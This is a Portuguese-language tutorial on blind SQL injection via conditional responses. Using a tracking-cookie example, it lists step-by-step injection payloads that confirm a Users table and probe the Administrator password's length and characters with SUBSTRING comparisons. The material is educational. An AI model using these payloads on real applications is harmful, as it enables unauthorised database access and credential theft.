## Explorando Blind SQL Injection através de Respostas Condicionais

Blind SQL Injection (SQLi Cega) pode ser explorado em situações onde a aplicação não retorna diretamente os resultados da consulta SQL injetada, mas apresenta um comportamento diferente com base nas condições que a consulta encontra. Esta técnica permite que um atacante extraia informações sensíveis ao manipular as respostas da aplicação a partir de condições SQL injetadas.

### Exemplo de Exploração

Considere uma aplicação que utiliza cookies de rastreamento para coletar dados analíticos sobre o uso dos usuários. Os pedidos enviados para a aplicação incluem um cabeçalho de cookie, como o exemplo abaixo:

```http
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Quando um pedido contendo o cookie `TrackingId` é processado, a aplicação utiliza a seguinte consulta SQL para verificar se o usuário é conhecido:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Esta consulta é vulnerável a SQL Injection, mas os resultados da consulta não são retornados ao usuário. No entanto, o comportamento da aplicação muda dependendo se a consulta retorna ou não dados. Por exemplo, se o `TrackingId` for reconhecido, a aplicação exibe uma mensagem de "Bem-vindo de volta" na resposta.

Esse comportamento permite que a vulnerabilidade de Blind SQL Injection seja explorada ao condicionar a resposta da aplicação com base em uma condição injetada.

### Como a Exploração Funciona

Para entender como essa exploração funciona, considere dois pedidos enviados à aplicação com os seguintes valores para o cookie `TrackingId`:

1. `…xyz' AND '1'='1`
2. `…xyz' AND '1'='2`

- **Primeiro valor:** A condição injetada `AND '1'='1` é verdadeira, então a consulta retorna resultados, e a mensagem de "Bem-vindo de volta" é exibida.
- **Segundo valor:** A condição injetada `AND '1'='2` é falsa, então a consulta não retorna resultados, e a mensagem de "Bem-vindo de volta" não é exibida.

Esse padrão de respostas permite determinar a verdade de qualquer condição injetada, e possibilita a extração de dados, um pedaço por vez.

### Exemplo de Extração de Dados

Vamos supor que existe uma tabela chamada `Users` com as colunas `Username` e `Password`, e um usuário chamado `Administrator`. É possível determinar a senha desse usuário enviando uma série de entradas para testar cada caractere da senha, um por vez.

**Passo 1:** Primeiramente valide se uma tabela `Users` existe:

```sql
xyz' AND (SELECT 'a' FROM Users LIMIT 1)='a
```

Caso a mensagem seja  "Bem-vindo de volta" for exibida, isso indica que a tabela `Users` existe.

**Passo 2:** Em seguida valide se as colunas `Username` e `Password` existem na tabela `Users`.

```sql
xyz' AND (SELECT 'a' FROM Users WHERE Username IS NOT NULL LIMIT 1)='a
```

Caso a mensagem seja  "Bem-vindo de volta" for exibida, isso indica que a coluna `Username` existe.


**Passo 3:** Em seguida valide se o usuário `Administrator` existe na tabela:

```sql
xyz' AND (SELECT 'a' FROM Users WHERE username = 'Administrator')='a
```

Caso a mensagem seja  "Bem-vindo de volta" for exibida, isso indica que o usuário existe.


**Passo 4:** Em seguida descubra o tamanho da senha do usuário `Administrador`:

```sql
xyz' AND (SELECT 'a' FROM Users WHERE username = 'Administrator' AND LENGTH(password)>8)='a
```

Caso a mensagem seja  "Bem-vindo de volta" for exibida, isso indica que a condição `LENGTH(password)>8` é verdadeira. Altere a condição até encontrar o comprimento exato da senha.


**Passo 5:** Descubra o primeiro caractere da senha:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Se a mensagem "Bem-vindo de volta" for exibida, isso indica que a condição injetada é verdadeira e, portanto, o primeiro caractere da senha é maior que `m`. Altere a condição até encontrar o caractere exato da senha.

**Passo 6:** Repita o processo até encontrar todos os caracteres da senha:

```sql
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 2, 1) > 'm
```


### Exemplo para contar número de linhas de uma tabela

```sql
xyz' AND (SELECT COUNT(*) FROM Users) = 1-- 
```

Caso a mensagem "Bem-vindo de volta" for exibida, isso indica que o número de linhas da tabela corresponde ao testado.

